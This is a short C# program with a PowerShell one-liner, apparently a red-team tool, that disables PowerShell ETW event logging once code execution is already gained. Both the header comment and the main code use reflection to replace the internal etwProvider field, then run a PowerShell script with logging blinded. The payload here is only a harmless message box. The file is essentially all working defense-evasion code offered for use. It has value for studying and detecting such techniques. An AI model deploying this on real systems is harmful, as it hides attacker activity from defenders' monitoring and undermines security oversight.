/*

One of the many ways one could disabled PS logging if there's prior code execution

Author: Lee Christensen (@tifkin_)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

Instructions:
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe DisablePSLogging.cs /reference:c:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
DisablePSLogging.exe



If you have a PS window open, you can run the following as well:

$EtwProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static');
$EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid());
$EtwProvider.SetValue($null, $EventProvider);

*/

using System;
using System.Management.Automation;
using System.Reflection;

namespace Program
{
    class Program
    {
        public static void Main(string[] args)
        {
            string Command = @"[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('Hello from PowerShell!');";

            using (PowerShell PowerShellInstance = PowerShell.Create())
            {
                var PSEtwLogProvider = PowerShellInstance.GetType().Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider");
                if(PSEtwLogProvider != null)
                {
                    var EtwProvider = PSEtwLogProvider.GetField("etwProvider", BindingFlags.NonPublic | BindingFlags.Static);
                    var EventProvider = new System.Diagnostics.Eventing.EventProvider(Guid.NewGuid());
                    EtwProvider.SetValue(null, EventProvider);
                }

                PowerShellInstance.AddScript(Command);
                PowerShellInstance.Invoke();
            }
        }
    }
}
